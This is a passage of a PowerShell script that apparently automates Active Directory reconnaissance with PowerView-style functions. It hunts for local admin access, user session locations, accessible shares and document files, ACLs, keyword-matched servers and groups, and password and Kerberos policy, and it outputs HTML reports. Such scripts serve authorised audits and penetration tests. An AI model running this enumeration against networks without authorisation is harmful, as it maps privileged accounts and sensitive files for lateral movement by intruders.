					"Container Name" = $GPOMapping.ContainerName
					"Computer Name" = $GPOMapping.ComputerName
					Domain = $Domain
				}
			}

			if ($TempGPOMachinesAdminlocalgroup) {
				$TempGPOMachinesAdminlocalgroup | Sort-Object Domain,"Object Name" | Format-Table -AutoSize -Wrap
				$HTMLGPOMachinesAdminlocalgroup = $TempGPOMachinesAdminlocalgroup | Sort-Object Domain,"Object Name" | ConvertTo-Html -Fragment -PreContent "<h2>Machines where a specific domain user/group is a member of the Administrators local group</h2>"
			}
		}
		else {
			$TempGPOMachinesAdminlocalgroup = foreach ($AllDomain in $AllDomains) {
				$GPOMappings = Get-DomainGPOUserLocalGroupMapping -Domain $AllDomain -LocalGroup Administrators
				foreach ($GPOMapping in $GPOMappings) {
					[PSCustomObject]@{
						"Object Name" = $GPOMapping.ObjectName
						"GPO Display Name" = $GPOMapping.GPODisplayName
						"Container Name" = $GPOMapping.ContainerName
						"Computer Name" = $GPOMapping.ComputerName
						Domain = $AllDomain
					}
				}
			}

			if ($TempGPOMachinesAdminlocalgroup) {
				$TempGPOMachinesAdminlocalgroup | Sort-Object Domain,"Object Name" | Format-Table -AutoSize -Wrap
				$HTMLGPOMachinesAdminlocalgroup = $TempGPOMachinesAdminlocalgroup | Sort-Object Domain,"Object Name" | ConvertTo-Html -Fragment -PreContent "<h2>Machines where a specific domain user/group is a member of the Administrators local group</h2>"
			}
		}
	}
		
	###############################################################################
    ########### Machines where a user is member of a specific group ###############
	###############################################################################
	
	if($MoreGPOs -OR $AllEnum){
		Write-Host ""
		Write-Host "Machines where a user is a member of a specific group:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$usersInGroup = Get-DomainUser -Domain $Domain -Server $Server | Find-GPOLocation -Domain $Domain -Server $Server
			$TempUsersInGroup = foreach ($userInGroup in $usersInGroup) {
				[PSCustomObject]@{
					"Object Name" = $userInGroup.ObjectName
					"Object SID" = $userInGroup.ObjectSID
					"Domain" = $userInGroup.Domain
					"Is Group" = $userInGroup.IsGroup
					"GPO Display Name" = $userInGroup.GPODisplayName
					"GPO Path" = $userInGroup.GPOPath
				}
			}

			if ($TempUsersInGroup) {
				$TempUsersInGroup | Sort-Object Domain,"Object Name" | Format-Table -AutoSize -Wrap
				$HTMLUsersInGroup = $TempUsersInGroup | Sort-Object Domain,"Object Name" | ConvertTo-Html -Fragment -PreContent "<h2>Machines where a user is a member of a specific group</h2>"
			}
		}
		else {
			$TempUsersInGroup = foreach ($AllDomain in $AllDomains) {
				$usersInGroup = Get-DomainUser -Domain $AllDomain | Find-GPOLocation -Domain $AllDomain
				foreach ($userInGroup in $usersInGroup) {
					[PSCustomObject]@{
						"Object Name" = $userInGroup.ObjectName
						"Object SID" = $userInGroup.ObjectSID
						"Domain" = $userInGroup.Domain
						"Is Group" = $userInGroup.IsGroup
						"GPO Display Name" = $userInGroup.GPODisplayName
						"GPO Path" = $userInGroup.GPOPath
					}
				}
			}

			if ($TempUsersInGroup) {
				$TempUsersInGroup | Sort-Object Domain,"Object Name" | Format-Table -AutoSize -Wrap
				$HTMLUsersInGroup = $TempUsersInGroup | Sort-Object Domain,"Object Name" | ConvertTo-Html -Fragment -PreContent "<h2>Machines where a user is a member of a specific group</h2>"
			}
		}

	}
	
	#################################################
    ######### Find Local Admin Access ###############
	#################################################
	
	if($FindLocalAdminAccess -OR $AllEnum){
        Write-Host ""
		Write-Host "Find Local Admin Access:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$LocalAdminAccess = Find-LocalAdminAccess -Server $Server -CheckShareAccess -Threads 100 -Delay 1
			$TempFindLocalAdminAccess = foreach ($AdminAccess in $LocalAdminAccess) {
				[PSCustomObject]@{
					"Target" = $AdminAccess
					"IP Address" = (Resolve-DnsName -Name $AdminAccess -Type A).IPAddress
					"Operating System" = Get-DomainComputer -Domain $Domain -Server $Server -Identity $AdminAccess | Select-Object -ExpandProperty operatingsystem
					"Domain" = $Domain
				}
			}

			if ($TempFindLocalAdminAccess) {
				$TempFindLocalAdminAccess | Sort-Object Domain,Target | Format-Table -AutoSize -Wrap
				$HTMLFindLocalAdminAccess = $TempFindLocalAdminAccess | Sort-Object Domain,Target | ConvertTo-Html -Fragment -PreContent "<h2>Local Admin Access</h2>"
			}
		}
		else {
			$TempFindLocalAdminAccess = foreach ($AllDomain in $AllDomains) {
				$LocalAdminAccess = Find-LocalAdminAccess -Domain $AllDomain -CheckShareAccess -Threads 100 -Delay 1
				foreach ($AdminAccess in $LocalAdminAccess) {
					[PSCustomObject]@{
						"Target" = $AdminAccess
						"IP Address" = (Resolve-DnsName -Name $AdminAccess -Type A).IPAddress
						"Operating System" = Get-DomainComputer -Domain $AllDomain -Identity $AdminAccess | Select-Object -ExpandProperty operatingsystem
						"Domain" = $AllDomain
					}
				}
			}

			if ($TempFindLocalAdminAccess) {
				$TempFindLocalAdminAccess | Sort-Object Domain,Target | Format-Table -AutoSize -Wrap
				$HTMLFindLocalAdminAccess = $TempFindLocalAdminAccess | Sort-Object Domain,Target | ConvertTo-Html -Fragment -PreContent "<h2>Local Admin Access</h2>"
			}
		}
    }
	
	###################################################
    ######### Find Domain User Location ###############
	###################################################
    
    if($FindDomainUserLocation -OR $AllEnum){
        Write-Host ""
		Write-Host "Find Domain User Location:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$UserLocations = Find-DomainUserLocation -Domain $Domain -Server $Server -Delay 1
			$TempFindDomainUserLocation = foreach ($UserLocation in $UserLocations) {
				[PSCustomObject]@{
					"User Name" = $UserLocation.UserName
					"User Domain" = $UserLocation.UserDomain
					"Computer Name" = $UserLocation.ComputerName
					"IP Address" = $UserLocation.IPAddress
					"Operating System" = Get-DomainComputer -Identity $UserLocation.ComputerName | Select-Object -ExpandProperty operatingsystem
					"Session From" = $UserLocation.SessionFrom
					"Session From Name" = $UserLocation.SessionFromName
					"Local Admin" = $UserLocation.LocalAdmin
				}
			}

			if ($TempFindDomainUserLocation) {
				$TempFindDomainUserLocation | Sort-Object "User Domain","User Name","Computer Name" | Format-Table -AutoSize -Wrap
				$HTMLFindDomainUserLocation = $TempFindDomainUserLocation | Sort-Object "User Domain","User Name","Computer Name" | ConvertTo-Html -Fragment -PreContent "<h2>Find Domain User Location</h2>"
			}
		}
		else {
			$TempFindDomainUserLocation = foreach ($AllDomain in $AllDomains) {
				$UserLocations = Find-DomainUserLocation -Domain $AllDomain -Delay 1
				foreach ($UserLocation in $UserLocations) {
					[PSCustomObject]@{
						"User Name" = $UserLocation.UserName
						"User Domain" = $UserLocation.UserDomain
						"Computer Name" = $UserLocation.ComputerName
						"IP Address" = $UserLocation.IPAddress
						"Operating System" = Get-DomainComputer -Identity $UserLocation.ComputerName | Select-Object -ExpandProperty operatingsystem
						"Session From" = $UserLocation.SessionFrom
						"Session From Name" = $UserLocation.SessionFromName
						"Local Admin" = $UserLocation.LocalAdmin
					}
				}
			}

			if ($TempFindDomainUserLocation) {
				$TempFindDomainUserLocation | Sort-Object "User Domain","User Name","Computer Name" | Format-Table -AutoSize -Wrap
				$HTMLFindDomainUserLocation = $TempFindDomainUserLocation | Sort-Object "User Domain","User Name","Computer Name" | ConvertTo-Html -Fragment -PreContent "<h2>Find Domain User Location</h2>"
			}
		}

    }
	
	###########################################################################
    ######### Logged on users for all machines in any Server OU ###############
	###########################################################################
	
	if($MoreOUs -OR $AllEnum){
		Write-Host ""
		Write-Host "Logged on users for all machines in any Server OU:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$LoggedOnUsersServerOU = Get-DomainOU -Identity *server* -Domain $Domain -Server $Server | %{Get-DomainComputer -Domain $Domain -Server $Server -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -Domain $Domain -Server $Server -ComputerName $_}}
			
			$TempLoggedOnUsersServerOU = foreach ($LoggedOnUser in $LoggedOnUsersServerOU) {
				[PSCustomObject]@{
					"User" = $LoggedOnUser.User
					"Domain" = $Domain
				}
			}
		}
		else {
			foreach ($AllDomain in $AllDomains) {
				$LoggedOnUsersServerOU = Get-DomainOU -Identity *server* -Domain $AllDomain | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}}
				
				$TempLoggedOnUsersServerOU = foreach ($LoggedOnUser in $LoggedOnUsersServerOU) {
					[PSCustomObject]@{
						"User" = $LoggedOnUser.User
						"Domain" = $AllDomain
					}
				}
			}
		}

  		if ($TempLoggedOnUsersServerOU) {
			$TempLoggedOnUsersServerOU | Sort-Object Domain,User | Format-Table -AutoSize -Wrap
			$HTMLLoggedOnUsersServerOU = $TempLoggedOnUsersServerOU | Sort-Object Domain,User | ConvertTo-Html -Fragment -PreContent "<h2>Logged on users for all machines in any Server OU</h2>"
		}
	}

 	########################################################################################
    ########### Windows 7 and Server 2008 Machines (Windows Remoting Enabled) ###############
	########################################################################################
	
	Write-Host ""
	Write-Host "Windows 7 and Server 2008 Machines (Windows Remoting Enabled):" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$WinRMComputers = Get-DomainComputer -Domain $Domain -Server $Server -LDAPFilter "(|(operatingsystem=*7*)(operatingsystem=*2008*))" -SPN "wsman*" -Properties samaccountname,lastlogontimestamp,dnshostname,objectsid,operatingsystem
		$TempWin7AndServer2008 = foreach ($Computer in $WinRMComputers) {
			[PSCustomObject]@{
				"Name" = $Computer.samaccountname
				"Enabled" = if ($Computer.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($Computer.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
				"IP Address" = (Resolve-DnsName -Name $Computer.DnsHostName -Type A).IPAddress
				"Account SID" = $Computer.objectsid
				"Operating System" = $Computer.operatingsystem
				"Domain" = $Domain
			}
		}
	}
	else {
		$TempWin7AndServer2008 = foreach ($AllDomain in $AllDomains) {
			$WinRMComputers = Get-DomainComputer -Domain $AllDomain -LDAPFilter "(|(operatingsystem=*7*)(operatingsystem=*2008*))" -SPN "wsman*" -Properties samaccountname,lastlogontimestamp,dnshostname,objectsid,operatingsystem
			foreach ($Computer in $WinRMComputers) {
				[PSCustomObject]@{
					"Name" = $Computer.samaccountname
					"Enabled" = if ($Computer.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($Computer.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = (Resolve-DnsName -Name $Computer.DnsHostName -Type A).IPAddress
					"Account SID" = $Computer.objectsid
					"Operating System" = $Computer.operatingsystem
					"Domain" = $AllDomain
				}
			}
		}
	}

	if ($TempWin7AndServer2008) {
		$TempWin7AndServer2008 | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap
		$HTMLWin7AndServer2008 = $TempWin7AndServer2008 | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2>Windows 7 and Server 2008 Machines (Windows Remoting Enabled)</h2>"
	}

 	############################################################
    ########### Servers (by Keyword) ###############
	############################################################

 	Write-Host ""
	Write-Host "Interesting Servers (by Keyword):" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$InterestingServers = @()
		foreach($Keyword in $Keywords){$InterestingServers += Get-DomainComputer -Domain $Domain -Server $Server -OperatingSystem "*Server*" -UACFilter NOT_ACCOUNTDISABLE | Where-Object { $_.samaccountname -like "*$Keyword*" }}
		$TempInterestingServersEnabled = foreach ($InterestingServer in $InterestingServers) {
			[PSCustomObject]@{
				"Name" = $InterestingServer.samaccountname
				"Enabled" = if ($InterestingServer.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($InterestingServer.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
				"IP Address" = (Resolve-DnsName -Name $InterestingServer.DnsHostName -Type A).IPAddress
				"Account SID" = $InterestingServer.objectsid
				"Operating System" = $InterestingServer.operatingsystem
				"Domain" = $Domain
				#Description = $InterestingServer.description
			}
		}
	}
	else {
		$TempInterestingServersEnabled = foreach ($AllDomain in $AllDomains) {
			$InterestingServers = @()
			foreach($Keyword in $Keywords){$InterestingServers += Get-DomainComputer -Domain $AllDomain -OperatingSystem "*Server*" -UACFilter NOT_ACCOUNTDISABLE | Where-Object { $_.samaccountname -like "*$Keyword*" }}
			foreach ($InterestingServer in $InterestingServers) {
				[PSCustomObject]@{
					"Name" = $InterestingServer.samaccountname
					"Enabled" = if ($InterestingServer.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($InterestingServer.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = (Resolve-DnsName -Name $InterestingServer.DnsHostName -Type A).IPAddress
					"Account SID" = $InterestingServer.objectsid
					"Operating System" = $InterestingServer.operatingsystem
					"Domain" = $AllDomain
					#Description = $InterestingServer.description
				}
			}
		}
	}

	if ($TempInterestingServersEnabled) {
		$TempInterestingServersEnabled | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap
		$HTMLInterestingServersEnabled = $TempInterestingServersEnabled | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2>Interesting Servers (by Keyword)</h2>"
	}

 	#######################################
    ########### GPOs by Keyword ################
	#######################################
        
        Write-Host ""
	Write-Host "Interesting GPOs (by Keyword):" -ForegroundColor Cyan
	if ($Domain -and $Server) {
 		$GetAllGPOsFirst = Get-DomainGPO -Domain $Domain -Server $Server -Properties DisplayName, gpcfilesyspath
		$TempKeywordDomainGPOs = foreach($Keyword in $Keywords){
			$KeywordDomainGPOs = $GetAllGPOsFirst | Where-Object { $_.DisplayName -like "*$Keyword*" }
			foreach ($DomainGPO in $KeywordDomainGPOs) {
				[PSCustomObject]@{
					Keyword = $Keyword
					"GPO Name" = $DomainGPO.DisplayName
					"Path" = $DomainGPO.gpcfilesyspath
					Domain = $Domain
				}
			}
		}
	}
	else {
		$TempKeywordDomainGPOs = foreach ($AllDomain in $AllDomains) {
  			$GetAllGPOsFirst = Get-DomainGPO -Domain $AllDomain -Properties DisplayName, gpcfilesyspath
			foreach($Keyword in $Keywords){
				$KeywordDomainGPOs = $GetAllGPOsFirst | Where-Object { $_.DisplayName -like "*$Keyword*" }
				foreach ($DomainGPO in $KeywordDomainGPOs) {
					[PSCustomObject]@{
						Keyword = $Keyword
						"GPO Name" = $DomainGPO.DisplayName
						"Path" = $DomainGPO.gpcfilesyspath
						Domain = $AllDomain
					}
				}
			}
		}
	}

 	if ($TempKeywordDomainGPOs) {
		$TempKeywordDomainGPOs | Sort-Object Domain,Keyword,"GPO Name" | Format-Table -AutoSize -Wrap
		$HTMLKeywordDomainGPOs = $TempKeywordDomainGPOs | Sort-Object Domain,Keyword,"GPO Name" | ConvertTo-Html -Fragment -PreContent "<h2>Interesting GPOs (by Keyword)</h2>"
	}
	
	#########################################
    ########### Groups by keyword ###########
	#########################################
	
	Write-Host ""
	Write-Host "Interesting Groups (by Keyword):" -ForegroundColor Cyan
	if ($Domain -and $Server) {
 		$findallgroupsfirst = Get-DomainGroup -Domain $Domain -Server $Server
		$TempGroupsByKeyword = foreach ($Keyword in $Keywords) {
  			$filteredGroups = $findallgroupsfirst | Where-Object { $_.SamAccountName -like "*$Keyword*" }
			foreach ($Group in $filteredGroups) {
				[PSCustomObject]@{
					"Keyword" = $Keyword
					"Group Name" = $Group.SamAccountName
					"Group SID" = $Group.ObjectSID
					"Domain" = $Domain
					#"Members" = ((Get-DomainGroupMember -Domain $Domain -Server $Server -Identity $Group.distinguishedname -Recurse).membername | Sort-Object -Unique) -join ' - '
					#Description = $Group.description
				}
			}
		}
	}
	else {
		$TempGroupsByKeyword = foreach ($AllDomain in $AllDomains) {
  			$findallgroupsfirst = Get-DomainGroup -Domain $AllDomain
			foreach ($Keyword in $Keywords) {
   				$filteredGroups = $findallgroupsfirst | Where-Object { $_.SamAccountName -like "*$Keyword*" }
				foreach ($Group in $filteredGroups) {
					[PSCustomObject]@{
						"Keyword" = $Keyword
						"Group Name" = $Group.SamAccountName
						"Group SID" = $Group.ObjectSID
						"Domain" = $AllDomain
						#"Members" = ((Get-DomainGroupMember -Identity $Group.distinguishedname -Domain $AllDomain -Recurse).membername | Sort-Object -Unique) -join ' - '
						#Description = $Group.description
					}
				}
			}
		}
	}

 	if ($TempGroupsByKeyword) {
		$TempGroupsByKeyword | Sort-Object Domain,Keyword,"Group Name" | Format-Table -AutoSize -Wrap
		$HTMLGroupsByKeyword = $TempGroupsByKeyword | Sort-Object Domain,Keyword,"Group Name" | ConvertTo-Html -Fragment -PreContent "<h2>Interesting Groups (by Keyword)</h2>"
	}
	
	#############################################
    ########### Domain OUs by Keyword ###########
	#############################################
	
	Write-Host ""
	Write-Host "Interesting OUs (by Keyword):" -ForegroundColor Cyan

	if($Domain -AND $Server) {
 		$GetAllOUsFirst = Get-DomainOU -Domain $Domain -Server $Server
		$TempDomainOUsByKeyword = foreach ($Keyword in $Keywords) {
  			$GetFilteredOUs = $GetAllOUsFirst | Where-Object {$_.name -like "*$Keyword*"}
			foreach ($ou in $GetFilteredOUs) {
				#$users = (Get-DomainUser -Domain $Domain -Server $Server -SearchBase "LDAP://$($ou.DistinguishedName)").samaccountname
				#$computers = Get-DomainComputer -Domain $Domain -Server $Server -SearchBase "LDAP://$($ou.DistinguishedName)"

				#$members = @()
				#if ($users) { $members += $users }
				#if ($computers) { $members += $computers.Name }

				[PSCustomObject]@{
					"Keyword" = $Keyword
					Name = $ou.Name
					Domain = $Domain
					#Members = $members -join ' - '
				}
			}
		}
	}
	else{
		$TempDomainOUsByKeyword = foreach($AllDomain in $AllDomains){
  			$GetAllOUsFirst = Get-DomainOU -Domain $AllDomain
			foreach ($Keyword in $Keywords) {
   				$GetFilteredOUs = $GetAllOUsFirst | Where-Object {$_.name -like "*$Keyword*"}
				foreach ($ou in $GetFilteredOUs) {
					#$users = (Get-DomainUser -Domain $AllDomain -SearchBase "LDAP://$($ou.DistinguishedName)").samaccountname
					#$computers = Get-DomainComputer -Domain $AllDomain -SearchBase "LDAP://$($ou.DistinguishedName)"

					#$members = @()
					#if ($users) { $members += $users }
					#if ($computers) { $members += $computers.Name }

					[PSCustomObject]@{
						"Keyword" = $Keyword
						Name = $ou.Name
						Domain = $AllDomain
						#Members = $members -join ' - '
					}
				}
			}
		}
	}

 	if($TempDomainOUsByKeyword) {
		$TempDomainOUsByKeyword | Sort-Object Domain,Keyword,Name | Format-Table -AutoSize -Wrap
		$HTMLDomainOUsByKeyword = $TempDomainOUsByKeyword | Sort-Object Domain,Keyword,Name | ConvertTo-Html -Fragment -PreContent "<h2>Interesting OUs (by Keyword)</h2>"
	}
	
	#######################################
    ######### Domain Shares ###############
	#######################################
	
	if($Shares -OR $AllEnum){
        	Write-Host ""
		Write-Host "Accessible Domain Shares:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$DomainShares = Find-DomainShare -ComputerDomain $Domain -Server $Server -CheckShareAccess -Threads 100 -Delay 1
			$TempDomainShares = foreach ($DomainShare in $DomainShares) {
				[PSCustomObject]@{
					"Name" = $DomainShare.Name
					"Computer Name" = $DomainShare.ComputerName
					"Remark" = $DomainShare.Remark
					Domain = $Domain
				}
			}
		}
		
		else {
			$TempDomainShares = foreach ($AllDomain in $AllDomains) {
				$DomainShares = Find-DomainShare -ComputerDomain $AllDomain -CheckShareAccess -Threads 100 -Delay 1
				foreach ($DomainShare in $DomainShares) {
					[PSCustomObject]@{
						"Name" = $DomainShare.Name
						"Computer Name" = $DomainShare.ComputerName
						"Remark" = $DomainShare.Remark
						Domain = $AllDomain
					}
				}
			}
		}

  		if ($TempDomainShares) {
			$TempDomainShares | Sort-Object Domain,"Computer Name",Name | Format-Table -AutoSize -Wrap
			$HTMLDomainShares = $TempDomainShares | Sort-Object Domain,"Computer Name",Name | ConvertTo-Html -Fragment -PreContent "<h2>Accessible Domain Shares</h2>"
		}


        	Write-Host ""
		Write-Host "Domain Share Files:" -ForegroundColor Cyan
		if($Domain -AND $Server) {
			$DomainShareFiles = Find-InterestingDomainShareFile -Server $Server -Threads 100 -Delay 1 | Select Owner,CreationTime,LastAccessTime,LastWriteTime,Path
			$TempDomainShareFiles = foreach ($DomainShareFile in $DomainShareFiles) {
				[PSCustomObject]@{
					"Owner" = $DomainShareFile.Owner
					"Path" = $DomainShareFile.Path
					"Domain" = $Domain
				}
			}
		}
		else{
			$TempDomainShareFiles = foreach($AllDomain in $AllDomains){
				$DomainShareFiles = Find-InterestingDomainShareFile -ComputerDomain $AllDomain -Threads 100 -Delay 1 | Select Owner,CreationTime,LastAccessTime,LastWriteTime,Path
				foreach($DomainShareFile in $DomainShareFiles){
					[PSCustomObject]@{
						"Owner" = $DomainShareFile.Owner
						"Path" = $DomainShareFile.Path
						"Domain" = $AllDomain
					}
				}
			}
		}

  		if($TempDomainShareFiles){
			$TempDomainShareFiles | Sort-Object Domain,Owner,Path | Format-Table -AutoSize -Wrap
			$HTMLDomainShareFiles = $TempDomainShareFiles | Sort-Object Domain,Owner,Path | ConvertTo-Html -Fragment -PreContent "<h2>Domain Share Files</h2>"
		}

        
        	Write-Host ""
		Write-Host "Domain Share Files (more file extensions):" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$InterestingFiles = Find-InterestingDomainShareFile -Server $Server -Include *.doc*, *.txt*, *.xls*, *.csv, *.ppt*, *.msi*, *.wim* -Threads 100 -Delay 1 
			$TempInterestingFiles = foreach ($File in $InterestingFiles) {
				[PSCustomObject]@{
					"Owner" = $File.Owner
					"Path" = $File.Path
					"Domain" = $Domain
				}
			}
		}
		else {
			$TempInterestingFiles = foreach ($AllDomain in $AllDomains) {
				$InterestingFiles = Find-InterestingDomainShareFile -ComputerDomain $AllDomain -Include *.doc*, *.txt*, *.xls*, *.csv, *.ppt*, *.msi*, *.wim* -Threads 100 -Delay 1
				foreach ($File in $InterestingFiles) {
					[PSCustomObject]@{
						"Owner" = $File.Owner
						"Path" = $File.Path
						"Domain" = $AllDomain
					}
				}
			}
		}

  		if ($TempInterestingFiles) {
			$TempInterestingFiles | Sort-Object Domain,Owner,Path | Format-Table -AutoSize -Wrap
			$HTMLInterestingFiles = $TempInterestingFiles | Sort-Object Domain,Owner,Path | ConvertTo-Html -Fragment -PreContent "<h2>Domain Share Files (more file extensions)</h2>"
		}

    	}
	
	#####################################
    ######### Domain ACLs ###############
	#####################################
    
    	if($DomainACLs -OR $AllEnum){
        	Write-Host ""
		Write-Host "Interesting ACLs:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$ACLScannerResults = Invoke-ACLScanner -Domain $Domain -Server $Server -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -notmatch "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions" }

			$TempACLScannerResults = foreach ($Result in $ACLScannerResults) {
				[PSCustomObject]@{
					"Identity Reference Name" = $Result.IdentityReferenceName
					"Object DN" = $Result.ObjectDN
					"Active Directory Rights" = $Result.ActiveDirectoryRights
					"Domain" = $Domain
				}
			}
		}
		else {
			$TempACLScannerResults = foreach ($AllDomain in $AllDomains) {
				$ACLScannerResults = Invoke-ACLScanner -Domain $AllDomain -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -notmatch "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions" }

				foreach ($Result in $ACLScannerResults) {
					[PSCustomObject]@{
						"Identity Reference Name" = $Result.IdentityReferenceName
						"Object DN" = $Result.ObjectDN
						"Active Directory Rights" = $Result.ActiveDirectoryRights
						"Domain" = $AllDomain
					}
				}
			}
		}

  		if ($TempACLScannerResults) {
			$TempACLScannerResults | Sort-Object Domain,"Identity Reference Name","Object DN" | Format-Table -AutoSize -Wrap
			$HTMLACLScannerResults = $TempACLScannerResults | Sort-Object Domain,"Identity Reference Name","Object DN" | ConvertTo-Html -Fragment -PreContent "<h2>Interesting ACLs:</h2>"
		}

    	}
	
	$AnalysisBanner = "<h3>Active Directory Domain Analysis</h3>"
	Write-Host ""
	Write-Host "Active Directory Domain Analysis" -ForegroundColor Red
	Write-Host ""
	
	################################################
    ######### Domain Password Policy ###############
	################################################
	
	
	Write-Host ""
	Write-Host "Domain Password Policy:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$DomainPolicy = Get-DomainPolicy -Domain $Domain -Server $Server
		$TempDomainPolicy = [PSCustomObject]@{
			"Domain" = $Domain
   			"Pwd Complexity" = $DomainPolicy.SystemAccess.PasswordComplexity
      			"Min Pwd Length" = $DomainPolicy.SystemAccess.MinimumPasswordLength
			"Min Pwd Age" = $DomainPolicy.SystemAccess.MinimumPasswordAge
			"Max Pwd Age" = $DomainPolicy.SystemAccess.MaximumPasswordAge
			"Password History" = $DomainPolicy.SystemAccess.PasswordHistorySize
			"Lockout Bad Count" = $DomainPolicy.SystemAccess.LockoutBadCount
			"Reset Lockout Count" = $DomainPolicy.SystemAccess.ResetLockoutCount
			"Lockout Duration" = $DomainPolicy.SystemAccess.LockoutDuration
			"Require Logon To Change Pwd" = $DomainPolicy.SystemAccess.RequireLogonToChangePassword
		}
	}
	else {
		$TempDomainPolicy = foreach ($AllDomain in $AllDomains) {
			$DomainPolicy = Get-DomainPolicy -Domain $AllDomain
			[PSCustomObject]@{
				"Domain" = $AllDomain
    				"Pwd Complexity" = $DomainPolicy.SystemAccess.PasswordComplexity
				"Min Pwd Length" = $DomainPolicy.SystemAccess.MinimumPasswordLength
				"Min Pwd Age" = $DomainPolicy.SystemAccess.MinimumPasswordAge
				"Max Pwd Age" = $DomainPolicy.SystemAccess.MaximumPasswordAge
				"Password History" = $DomainPolicy.SystemAccess.PasswordHistorySize
				"Lockout Bad Count" = $DomainPolicy.SystemAccess.LockoutBadCount
				"Reset Lockout Count" = $DomainPolicy.SystemAccess.ResetLockoutCount
				"Lockout Duration" = $DomainPolicy.SystemAccess.LockoutDuration
				"Require Logon To Change Pwd" = $DomainPolicy.SystemAccess.RequireLogonToChangePassword
			}
		}
	}

 	if ($TempDomainPolicy) {
		$TempDomainPolicy | Sort-Object Domain | Format-Table -AutoSize -Wrap
		$HTMLDomainPolicy = $TempDomainPolicy | Sort-Object Domain | ConvertTo-Html -Fragment -PreContent "<h2>Domain Password Policy</h2>"
	}

	
	#########################################
    ######### Kerberos Policy ###############
	#########################################
	
	Write-Host ""
	Write-Host "Kerberos Password Policy:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$KerberosPolicy = Get-DomainPolicy -Domain $Domain -Server $Server
		$TempKerberosPolicy = [PSCustomObject]@{
			"Domain" = $Domain
			"Max Ticket Age" = $KerberosPolicy.KerberosPolicy.MaxTicketAge
			"Max Renew Age" = $KerberosPolicy.KerberosPolicy.MaxRenewAge
			"Max Service Age" = $KerberosPolicy.KerberosPolicy.MaxServiceAge
			"Max Clock Skew" = $KerberosPolicy.KerberosPolicy.MaxClockSkew
			"Ticket Validate Client" = $KerberosPolicy.KerberosPolicy.TicketValidateClient
		}
	}
	else {
		$TempKerberosPolicy = foreach ($AllDomain in $AllDomains) {
			$KerberosPolicy = Get-DomainPolicy -Domain $AllDomain
			[PSCustomObject]@{
				"Domain" = $AllDomain
				"Max Ticket Age" = $KerberosPolicy.KerberosPolicy.MaxTicketAge
				"Max Renew Age" = $KerberosPolicy.KerberosPolicy.MaxRenewAge
				"Max Service Age" = $KerberosPolicy.KerberosPolicy.MaxServiceAge
				"Max Clock Skew" = $KerberosPolicy.KerberosPolicy.MaxClockSkew
				"Ticket Validate Client" = $KerberosPolicy.KerberosPolicy.TicketValidateClient
			}
		}
	}

 	if ($TempKerberosPolicy) {
		$TempKerberosPolicy | Sort-Object Domain | Format-Table -AutoSize -Wrap
		$HTMLKerberosPolicy = $TempKerberosPolicy | Sort-Object Domain | ConvertTo-Html -Fragment -PreContent "<h2>Kerberos Password Policy</h2>"
	}
	
	##################################################
    ########### User Accounts Analysis ###############
	##################################################
	
	Write-Host ""
	Write-Host "User Accounts Analysis:" -ForegroundColor Cyan

	if ($Domain -and $Server) {
		
		$UserAccountAnalysis = Get-DomainUser -Domain $Domain -Server $Server
		
		$TempUserAccountAnalysis = [PSCustomObject]@{
  			Domain = $Domain
			'Nb User Accounts' = $UserAccountAnalysis.Name.count
			'Nb Enabled' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -notmatch "ACCOUNTDISABLE" }).Name.Count
			'Nb Disabled' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -band 2 }).Name.Count
			'Nb Active' = ($UserAccountAnalysis | Where-Object { $_.lastlogontimestamp -ge $inactiveThreshold}).Name.count
			'Nb Inactive' = ($UserAccountAnalysis | Where-Object { $_.lastlogontimestamp -lt $inactiveThreshold}).Name.count
			'Nb Locked' = ($UserAccountAnalysis | Where-Object { $_.lockouttime -ne $null }).Name.Count
			'Nb Pwd Never Expire' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -match "DONT_EXPIRE_PASSWORD" }).Name.Count
			'Nb Password not Req.' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -match "PASSWD_NOTREQD" }).Name.Count
			'Nb Reversible Password' = ($UserAccountAnalysis | Where-Object { $_.useraccountcontrol -band 128 }).Name.count
		}		
	}
	
	else{
		
		$TempUserAccountAnalysis = foreach ($AllDomain in $AllDomains) {
			$UserAccountAnalysis = Get-DomainUser -Domain $AllDomain
			
			[PSCustomObject]@{
   				Domain = $AllDomain
				'Nb User Accounts' = $UserAccountAnalysis.Name.count
